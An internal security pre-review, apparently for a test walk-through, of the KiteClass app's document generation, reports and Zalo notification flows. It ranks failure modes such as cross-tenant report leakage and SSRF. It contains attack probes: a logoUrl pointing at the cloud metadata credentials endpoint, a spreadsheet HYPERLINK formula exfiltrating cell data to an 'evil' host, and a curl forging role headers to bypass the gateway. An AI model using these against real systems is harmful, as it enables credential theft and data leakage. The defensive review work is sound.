# Pre-Walk Persona Simulation — KC-11 Notification (Zalo OA) + Document Generation (PDF/XLSX/DOCX) + Reports

**Flow:** KC-11 — ADMIN/OWNER/TEACHER của 1 tenant KiteClass: (1) generate branded document `POST /api/v1/documents/{format}/preview|download` (PDF invoice / XLSX attendance / DOCX), (2) ADMIN xem analytics `GET /api/v1/reports/revenue` + `/attendance`, (3) parent-facing notifications: Zalo OA stub (`ZaloOaNotificationServiceImpl` — GAP-721/Wave 105) + parent notifications facet `GET /api/v1/parent/children/{childId}/notifications` (stub empty page). Side-effects: PDF/XLSX bytes streamed inline (KHÔNG lưu MinIO), Zalo intent → `zalo_oa_notification_outbox` table (KHÔNG email/MailHog/RabbitMQ trong scope này).
**Date:** 2026-06-06
**Mandate:** `.claude/rules/pre-walk-persona-simulation-mandate.md` (prediction-only, KHÔNG fix).
**Stack:** gateway `:9000` (default-filter strip `X-Tenant-Id`/`X-User-Id`/`X-User-Reference-Id` per GAP-814 → re-inject từ JWT verified; `instance-apis` catch-all `/api/v1/**` áp `TenantResolver` → `kiteclass-core:8080`). kiteclass-core: `SecurityConfig.anyRequest().permitAll()` (URL-layer) + `GatewayHeaderAuthenticationFilter` bridge `X-User-Roles` → `ROLE_*` authorities (KC-7 G1 fix 2026-06-05) + `TenantFilterInterceptor` enable Hibernate `tenantFilter` từ `X-Tenant-Id`.

---

## Câu trả lời 2 câu hỏi headline

### (i) Có routing collision kiểu KC-10 cho `/api/v1/documents` + `/api/v1/reports` không? → **KHÔNG** ✅ (contrast KC-10)

Khác hẳn KC-10. KC-10 vỡ vì có route kitehub explicit `kitehub-branding-v1` (`application.yml:593-601`, `Path=/api/v1/branding/**`) khai báo TRƯỚC catch-all → shadow 3 KiteClass controller. Với KC-11, **KHÔNG có route kitehub nào** match `/api/v1/documents` hoặc `/api/v1/reports`. Scan toàn bộ route list (`application.yml:35-756`): auth-v1 (`/api/v1/auth/**`), admin-v1 (`/api/v1/admin/**`), consent/dsar/notification-preferences, branding-v1, beta-status, staff-invitations, onboarding-progress, public-tenant-landing/resolve, kc-tenant-auth, feedback — KHÔNG cái nào match `documents`/`reports`. Cả hai rơi xuống `instance-apis` catch-all (`:746-755`, `Path=/api/v1/**`) → `TenantResolver` → kiteclass-core. **Documents + reports + parent notifications đều reachable qua gateway bình thường.** Walk được qua gateway (khác KC-10 phải direct-curl). Đây là contrast PASS lớn nhất.

### (ii) TEACHER có generate được cross-tenant PDF (IDOR) không? → **KHÔNG qua entity-id** ✅ nhưng **CÓ 2 đường rò khác** ⚠️

Câu hỏi "pass invoice id của tenant khác → PDF" **KHÔNG materialize**: `DocumentGenerationRequestDto` (`dto/DocumentGenerationRequestDto.java:12-14`) chỉ có `templateId` + `data` (Map). Service **KHÔNG fetch entity nào theo id** — toàn bộ nội dung document (tên học sinh, line items hóa đơn, điểm danh) do **caller tự POST trong `data` map**. `InvoiceRenderer.render()` + `AttendanceReportBuilder.build()` chỉ render `request.data()`. Không có lookup invoice/student/class theo id → không có IDOR kiểu "đọc data tenant khác". Thứ duy nhất server-side resolve là branding (`brandingService.getBranding()`, tenant-scoped).

NHƯNG 2 đường rò thật, KHÔNG phải qua document-data:
- **FM-1 (reports):** `GET /reports/revenue` + `/attendance` query Payment/Attendance qua Hibernate `tenantFilter` — filter CHỈ bật khi `X-Tenant-Id` header có mặt+hợp lệ. Thiếu header → filter KHÔNG bật → aggregate **TẤT CẢ tenant**.
- **FM-2 (documents):** branding assembler để **caller data WIN** → TEACHER inject `branding.logoUrl` trỏ tới internal endpoint → OpenHTMLtoPDF fetch → SSRF.

---

## Ranked failure modes (confidence × impact)

### FM-1 🟠 Reports cross-tenant aggregate leak khi `X-Tenant-Id` absent — `tenantFilter` không bật, query unscoped
- **(a) Where:** `config/TenantFilterInterceptor.java:77-100` — `tenantFilter` CHỈ `enableFilter` khi `tenantHeader != null && !isBlank` (`:79`). Header thiếu → `else` branch `:98-100` chỉ log "tenant filter not enabled", **KHÔNG reject**. `ReportServiceImpl.getRevenueReport():58` + `getAttendanceReport():91` gọi `revenueReportRepository.sumCompletedRevenueByMonth(from,to)` / `attendanceReportRepository.countAttendanceByMonth(from,to)` — query JPQL (`RevenueReportRepository.java:41-46`, `AttendanceReportRepository.java:36-43`) KHÔNG có `instance_id` predicate trong WHERE (dựa hoàn toàn vào Hibernate filter). Filter off → `SUM(amount)` / `COUNT(attendance)` trên **mọi tenant** trong cùng physical DB.
- **(b) Symptom walker thấy:** Qua gateway `instance-apis` route áp `TenantResolver` → set `X-Tenant-Id` → bình thường scoped đúng. NHƯNG: (a) curl THẲNG `kiteclass-core:8080/api/v1/reports/revenue` (bypass gateway, không header) → trả revenue tổng của TẤT CẢ tenant chung 1 DB; (b) nếu `TenantResolver` fallback trả null (localhost/apex không subdomain, JWT thiếu tenantId claim) → cùng leak. ADMIN role gate (`ReportController.java:55,74` `hasRole('ADMIN')`) chỉ chặn non-admin, KHÔNG chặn cross-tenant. Defense-in-depth chỉ-1-lớp (Hibernate filter), không có lớp 2 reject-on-missing-tenant. Note: kiteclass-core multi-tenant theo per-tenant DB (kiteclass_<hash>) — nếu mỗi tenant DB riêng thì blast radius = chỉ rò trong cùng DB; cần xác minh deployment model (shared `kiteclass_shared` vs per-tenant physical DB) lúc walk.
- **(c) Pre-walk check:**
  ```bash
  # 1) Reports query KHÔNG có instance_id predicate (dựa Hibernate filter)
  grep -n "instance_id\|instanceId\|WHERE" \
    kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/report/repository/*.java
  # 2) Interceptor: thiếu X-Tenant-Id → filter off, KHÔNG reject
  sed -n '77,100p' kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/config/TenantFilterInterceptor.java
  # 3) Walk: curl reports KHÔNG có X-Tenant-Id (direct kiteclass-core:8080 nếu expose) → expect leak vs 400
  curl -s -i -H "X-User-Roles: ADMIN" -H "X-User-Id: <uuid>" \
    "http://localhost:8080/api/v1/reports/revenue?months=12" | head -20
  # 4) Verify deployment: payments của nhiều tenant cùng 1 DB?
  docker exec kite-postgres psql -U <user> -d <db> -c "SELECT DISTINCT instance_id FROM payments LIMIT 5"
  ```

### FM-2 🟠 SSRF — TEACHER inject `branding.logoUrl` vào `data`, assembler để CALLER WIN → OpenHTMLtoPDF fetch URL
- **(a) Where:** `document/branding/DocumentBrandingAssembler.java:41-42` — `merged.putAll(request.data())` SAU khi put branding server-side → **"Caller-provided data wins"** (javadoc `:18,41`). `InvoiceRenderer.buildContext():79-87` lift `branding.logoUrl` → `brand.logoUrl`. Template `templates/pdf/invoice.html:34` `<img ... th:src="${brand.logoUrl}">`. `InvoiceRenderer.render():59-65` dùng `PdfRendererBuilder` (OpenHTMLtoPDF) — by default fetch external `<img src>` tại render time.
- **(b) Symptom:** TEACHER POST `/api/v1/documents/pdf/download` body `{"templateId":"invoice","data":{"branding.logoUrl":"http://169.254.169.254/latest/meta-data/iam/security-credentials/","invoiceNumber":"x"}}` → assembler giữ caller logoUrl (override server branding) → renderer fetch internal metadata endpoint từ trong network kiteclass-core → SSRF (đọc cloud metadata / internal service / port-scan). PDF có thể KHÔNG hiện kết quả (img fail render) → blind SSRF, nhưng request side-effect đã xảy ra. Cũng exfil khả dĩ nếu response nhúng được. KHÔNG có allowlist/denylist trên logoUrl (khác A10 SSRF guard). Walker: nếu OpenHTMLtoPDF config `useFastMode()` (`:60`) vẫn cho external resource → confirm fetch. `th:src` KHÔNG escape URL (khác `th:text`).
- **(c) Pre-walk check:**
  ```bash
  # Caller data overrides server branding?
  sed -n '40,50p' kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/document/branding/DocumentBrandingAssembler.java
  # img src từ brand.logoUrl + renderer external fetch?
  grep -n "th:src\|logoUrl" kiteclass/kiteclass-core/src/main/resources/templates/pdf/invoice.html
  grep -n "PdfRendererBuilder\|useFastMode\|baseUri\|setUriResolver\|FSUriResolver" \
    kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/document/pdf/InvoiceRenderer.java
  # Walk: POST invoice với branding.logoUrl=http://169.254.169.254/... → quan sát egress (tcpdump/log)
  ```

### FM-3 🟠 NPE → 500 trong `DocumentGenerationController.render()` khi `TenantContext` null
- **(a) Where:** `document/controller/DocumentGenerationController.java:84` `UUID tenant = TenantContext.getCurrentTenant();` rồi `:90` `.tenantId(tenant.toString())`. `getCurrentTenant()` null khi `X-Tenant-Id` thiếu (FM-1 cùng root). `tenant.toString()` → NullPointerException → `GlobalExceptionHandler.java:330` `@ExceptionHandler(Exception.class)` → HTTP **500** (`:343`).
- **(b) Symptom:** Walk `POST /api/v1/documents/pdf/preview` qua gateway mà tenant context không set đúng (localhost không subdomain, hoặc TenantResolver fallback null) → 500 thay vì 400/branded-error. Walker tưởng generator hỏng nhưng thực ra là tenant null NPE. Khác reports (FM-1 leak silently), documents crash loud. So sánh: ReportController KHÔNG đọc `TenantContext.getCurrentTenant()` trực tiếp (dựa filter) nên reports không NPE — chỉ documents NPE.
- **(c) Pre-walk check:**
  ```bash
  sed -n '83,109p' kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/document/controller/DocumentGenerationController.java
  # Walk: POST documents/pdf/preview với Host header tenant đúng → expect 200; thiếu tenant → 500 NPE (bug)
  curl -s -i -H "Host: <slug>.localhost" -H "X-User-Roles: TEACHER" -H "Authorization: Bearer $JWT" \
    -H "Content-Type: application/json" \
    -d '{"templateId":"invoice","data":{"invoiceNumber":"INV-1","total":1500000}}' \
    "http://localhost:9000/api/v1/documents/pdf/preview" | head -20
  ```

### FM-4 🟡 Zalo OA stub `resolveTenantId()` HARDCODE nil-UUID → outbox rows mis-tenant-attribution (latent Wave 106 RLS)
- **(a) Where:** `module/parent/notification/impl/ZaloOaNotificationServiceImpl.java:137-141` `resolveTenantId()` `return "00000000-0000-0000-0000-000000000000"` (nil UUID hardcode, KHÔNG đọc `TenantContext`). INSERT (`:35-38`) gán `instance_id = nil` cho MỌI tenant. Caller `ParentPaymentController.java:171` `recordPaymentConfirm(...)`.
- **(b) Symptom:** Stub bản thân graceful — `REQUIRES_NEW` + try/catch swallow (`:47,62-66`) → KHÔNG break parent payment txn (đúng `audit-service-isolation.md`, contrast KH-10 GAP-1031). NHƯNG mọi row `zalo_oa_notification_outbox` của mọi tenant có `instance_id = nil-uuid` → Wave 106 dispatcher đọc outbox + RLS sẽ KHÔNG phân biệt được tenant → cross-tenant notification mix / RLS-bypass khi dispatch thật. Latent (Wave 106 GAP-286). Walker hiện chỉ thấy log `"would send Zalo OA: ..."` + 1 row outbox nil-tenant — KHÔNG có ZNS API call, KHÔNG email. Thêm: `ParentPaymentController:174` truyền literal `"<childName>"` placeholder → payload outbox chứa literal `<childName>` (Wave 106 chưa resolve).
- **(c) Pre-walk check:**
  ```bash
  sed -n '127,141p' kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/parent/notification/impl/ZaloOaNotificationServiceImpl.java
  # Sau khi walk payment confirm: kiểm outbox rows có nil instance_id không
  docker exec kite-postgres psql -U <user> -d <tenant-db> \
    -c "SELECT instance_id, event_type, payload FROM zalo_oa_notification_outbox ORDER BY id DESC LIMIT 3"
  ```

### FM-5 🟡 Notification dispatch KHÔNG có email/MailHog/RabbitMQ trong KC-11 — toàn stub/outbox (expectation-setting)
- **(a) Where:** KHÔNG có `RabbitConfig` trong kiteclass-core (`find ... RabbitConfig` = 0 hit). Zalo path chỉ INSERT outbox (`ZaloOaNotificationServiceImpl`). `ParentNotificationsFacetController.java:53-63` — Phase 1B stub trả **empty page** (javadoc `:33-38` "endpoint returns an empty page after the scope guard succeeds"; cross-cutting engine = Wave 18a GAP-063b chưa ship).
- **(b) Symptom:** Walker kỳ vọng "notification → email tới MailHog" hoặc "Zalo gửi thật" sẽ KHÔNG thấy gì. `GET /parent/children/{childId}/notifications` luôn trả `[]` (page rỗng) kể cả khi đã có payment/attendance event. Đây KHÔNG phải bug — là MVP stub scope. Đừng coi empty page / no-email là regression. Verify: parent facet đã walk ở KC-8 (chỉ flag NEW notification-specific issue: scope guard `@authz.hasAccessToChild(#childId)` + `X-User-Reference-Id` null → `AUTH_REQUIRED` 401 `:65-69`).
- **(c) Pre-walk check:**
  ```bash
  sed -n '49,63p' kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/parent/controller/ParentNotificationsFacetController.java
  grep -rn "getNotificationsForChild" kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/parent/service/ | head
  # Walk: GET parent notifications → expect 200 + empty page (KHÔNG phải bug)
  ```

### FM-6 🟡 XLSX/CSV formula injection — student name viết `setCellValue` (string cell), KHÔNG sanitize leading `=+-@`
- **(a) Where:** `document/xlsx/AttendanceReportBuilder.java:105` `write(row, 0, name, styles.input)` → `:176-180` `cell.setCellValue(value)` (STRING cell). `name`/`status` từ caller `data.students[].name` + `data.attendance` (`:48-49`). Formula chỉ set ở COUNTIF/SUM columns server-controlled (`:113-122,134-148`). KHÔNG strip leading `=`/`+`/`-`/`@`/`\t` khỏi caller string.
- **(b) Symptom:** TEACHER POST `data.students[].name = "=HYPERLINK(\"http://evil/?\"&A1,\"x\")"` → lưu string cell. POI string cell type → Excel **thường** hiện literal text (string cell KHÔNG auto-eval formula) → risk thấp hơn CSV thuần. NHƯNG vài Excel/LibreOffice version + "convert text to formula" → eval khi mở → CSV-injection class (data exfil / cmd). Vì document là caller-typed-data (không phải fetched data của người khác), kẻ tấn công chủ yếu tự hại file mình tải — trừ khi file gửi cho người khác (giáo viên gửi báo cáo cho phụ huynh/admin). Severity moderate-low. `className`/`weekStart` (title `:76-77`) cùng class.
- **(c) Pre-walk check:**
  ```bash
  grep -n "setCellValue\|setCellFormula\|replace\|startsWith(\"=\"" \
    kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/document/xlsx/AttendanceReportBuilder.java
  # Walk: POST xlsx attendance với student name "=1+1" → tải file → mở Excel → hiện text hay eval?
  ```

### FM-7 🟢 Format path-var + preview validation OK → 400 (verified, KHÔNG 500); PDF HTML-injection escaped
- **(a) Where:** `DocumentGenerationController.parseFormat():111-121` — unknown format → `IllegalArgumentException` → `GlobalExceptionHandler.java:160-170` → HTTP **400** (verified). Preview non-PDF (`:67-70`) → IllegalArgumentException → 400. Path traversal `{format}` = 1 path segment, Spring không match `/` encoded → reject. Invoice template `invoice.html:35,42,43,58` dùng `th:text` (auto-escape) cho mọi caller field (`buyerName`/`item.description`/`brand.displayName`) → HTML injection escaped (chỉ `th:src` logoUrl không escape → FM-2).
- **(b) Symptom:** `{format}=exe` → 400 (không 500). `pdf/../../etc` → Spring 404/400. HTML `<script>` trong `buyerName` → escaped trong PDF (vô hại; PDF không exec JS qua OpenHTMLtoPDF dù sao). Đây là note "ĐÃ AN TOÀN" để walker không chase. Chỉ `th:src` logoUrl là vector thật (FM-2).
- **(c) Pre-walk check:**
  ```bash
  grep -n "th:text\|th:utext\|th:src" kiteclass/kiteclass-core/src/main/resources/templates/pdf/invoice.html
  sed -n '160,170p' kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/common/exception/GlobalExceptionHandler.java
  # Walk: POST documents/exe/download → expect 400; documents/xlsx/preview → expect 400 (preview PDF-only)
  ```

### FM-8 🟢 Documents KHÔNG lưu MinIO — stream bytes trực tiếp (PASS, contrast KC-10 GAP-1036)
- **(a) Where:** `DocumentGenerationController.render():105-108` `ResponseEntity.ok().header(CONTENT_DISPOSITION...).body(doc.bytes())` — trả `byte[]` trực tiếp, KHÔNG `minioClient.putObject`. Generators (`InvoiceRenderer:66`, `AttendanceReportBuilder:67`) trả `DocumentResponse.of(bytes,...)` in-memory.
- **(b) Symptom:** KHÔNG có `NoSuchBucket`/`kiteclass-files` 500 risk (khác KC-10 GAP-1036 branding asset). Walker download → nhận bytes inline/attachment. An toàn — KHÔNG cần MinIO bucket cho KC-11 documents. (Branding logoUrl trong PDF là URL fetch, không phải MinIO store — xem FM-2.)
- **(c) Pre-walk check:**
  ```bash
  grep -rn "minio\|MinioClient\|putObject\|getObject" \
    kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/document/ || echo "no minio in document module — confirmed stream-only"
  ```

### FM-9 🟢 Role bridge ADMIN/TEACHER hoạt động — `X-User-Roles` → `ROLE_*` (verify gateway forward)
- **(a) Where:** `config/GatewayHeaderAuthenticationFilter.java:103-117` `toAuthorities()` — split comma, `toUpperCase()`, prefix `ROLE_` (`:110-113`). `reports hasRole('ADMIN')` → `ROLE_ADMIN`; `documents hasAnyRole('ADMIN','OWNER','TEACHER')` → khớp. KC-7 G1 fix (`SecurityConfig:56` comment, 2026-06-05) — không còn 24-endpoint dead-deny.
- **(b) Symptom:** OWNER đã confirm work (KC-10). ADMIN/TEACHER cũng map đúng NẾU gateway forward `X-User-Roles`. Risk: gateway `JwtAuthenticationGatewayFilter` (GAP-604) phải set `X-User-Roles` từ JWT roles claim trên `instance-apis` route. Nếu JWT KiteClass-native (parent/teacher login Wave auth-1) carry role khác format → mismatch. Verify lúc walk: TEACHER token → documents 200 (không 403); non-ADMIN (TEACHER) → reports 403 (đúng, reports ADMIN-only).
- **(c) Pre-walk check:**
  ```bash
  sed -n '103,117p' kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/config/GatewayHeaderAuthenticationFilter.java
  # Walk: TEACHER token → POST documents/pdf/preview → 200; GET reports/revenue → expect 403 (ADMIN-only)
  ```

### FM-10 🟢 Document generation DoS — `data.students` / `data` map unbounded, KHÔNG cap rows
- **(a) Where:** `AttendanceReportBuilder.writeStudentRows():98` loop `students.size()` không cap; `DocumentGenerationRequestDto.data` (`dto:13`) `Map<String,Object>` không size limit; controller `@Valid` chỉ check `@NotBlank templateId`. `MaxUploadSizeExceededException` handler có (`GlobalExceptionHandler:314`) nhưng đó là multipart, document body là JSON.
- **(b) Symptom:** TEACHER POST `data.students` = 1M phần tử → XLSX build in-memory `XSSFWorkbook` → OOM / GC pressure / slow → DoS 1 instance. JSON body size cap (Spring `maxHttpRequestHeaderSize`/server) là lớp duy nhất. Reports đã cap `months` 1..36 (`ReportServiceImpl:44,127-132`) → reports an toàn; documents không cap. Low (cần authenticated TEACHER + large payload).
- **(c) Pre-walk check:**
  ```bash
  grep -n "size()\|@Size\|@Max\|MAX_\|limit" \
    kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/document/xlsx/AttendanceReportBuilder.java \
    kiteclass/kiteclass-core/src/main/java/com/kiteclass/core/module/document/dto/DocumentGenerationRequestDto.java
  ```

---

## Tóm tắt cho walker

| # | Severity | 1-dòng | Loại |
|---|---|---|---|
| FM-1 | 🟠 | Reports `tenantFilter` không bật khi thiếu `X-Tenant-Id` → aggregate cross-tenant revenue/attendance | Tenant-isolation (high-value real) |
| FM-2 | 🟠 | Assembler để caller data WIN → TEACHER inject `branding.logoUrl` → OpenHTMLtoPDF fetch → SSRF | SSRF (A10) |
| FM-3 | 🟠 | `DocumentGenerationController.render()` `tenant.toString()` NPE → 500 khi TenantContext null | NPE 500 (walk-blocker partial) |
| FM-4 | 🟡 | Zalo stub `resolveTenantId()` hardcode nil-UUID → outbox rows mis-tenant (latent Wave 106 RLS) | Data-integrity (latent) |
| FM-5 | 🟡 | KC-11 notification toàn stub/outbox — KHÔNG email/MailHog/Zalo thật; parent facet trả empty page | Expectation-setting |
| FM-6 | 🟡 | XLSX student name `setCellValue` string cell, không sanitize `=+-@` → CSV-injection class | File-export security |
| FM-7 | 🟢 | Format/preview validation → 400 (verified); PDF caller fields `th:text` escaped — ĐỪNG chase | Validation ✅ safe |
| FM-8 | 🟢 | Documents stream bytes, KHÔNG lưu MinIO — không NoSuchBucket 500 (contrast KC-10) | Storage ✅ |
| FM-9 | 🟢 | Role bridge ADMIN/TEACHER → ROLE_* đúng (verify gateway forward X-User-Roles) | Authz ✅ |
| FM-10 | 🟢 | Document `data.students` unbounded → OOM DoS (reports đã cap months 1..36) | DoS (low) |

**Pre-walk MUST-run trước khi mở flow (4 check quyết định walk + risk thật):**

1. **FM-1 reports tenant scoping** — `grep -n "instance_id\|WHERE" .../report/repository/*.java` (xác nhận query dựa Hibernate filter, KHÔNG có explicit instance_id predicate) + `sed -n '77,100p' TenantFilterInterceptor.java` (thiếu header → filter off, không reject) + verify deployment model `docker exec kite-postgres psql -c "SELECT DISTINCT instance_id FROM payments"`. **Quyết định: reports có rò cross-tenant khi thiếu X-Tenant-Id không, blast radius = shared DB hay per-tenant DB.** Đây là finding cao giá trị nhất.
2. **FM-3 + headline (ii)** — `sed -n '83,109p' DocumentGenerationController.java` (`tenant.toString()` NPE) + walk `POST documents/pdf/preview` VỚI Host header tenant đúng (expect 200) vs thiếu tenant (expect 500 NPE). **Quyết định: document generation walk được qua gateway không, có NPE 500 khi tenant null không.**
3. **FM-2 SSRF** — `sed -n '40,50p' DocumentBrandingAssembler.java` (caller WIN confirmed) + `grep th:src .../invoice.html` + `grep "useFastMode\|baseUri\|UriResolver" InvoiceRenderer.java`. **Quyết định: TEACHER inject branding.logoUrl=http://169.254.169.254/... có khiến renderer egress request không (SSRF thật vs renderer block external).**
4. **FM-9 role bridge** — `sed -n '103,117p' GatewayHeaderAuthenticationFilter.java` + walk TEACHER token → documents 200 + reports 403 (ADMIN-only). **Quyết định: ADMIN/TEACHER authz hoạt động qua gateway X-User-Roles forward không (xác nhận KC-7 fix cover documents+reports).**

4 cái này quyết định: (a) reports có lỗ cross-tenant aggregate không (cao nhất), (b) document gen walk được + có NPE không, (c) SSRF qua logoUrl có live không, (d) authz ADMIN/TEACHER có đúng không. Headline: **KHÔNG có routing collision** (contrast KC-10) + **KHÔNG có document-data IDOR** (caller-data-driven) — 2 đường rò thật là reports-no-tenant-header (FM-1) + logoUrl-SSRF (FM-2), KHÔNG phải kiểu KC-10/IDOR.
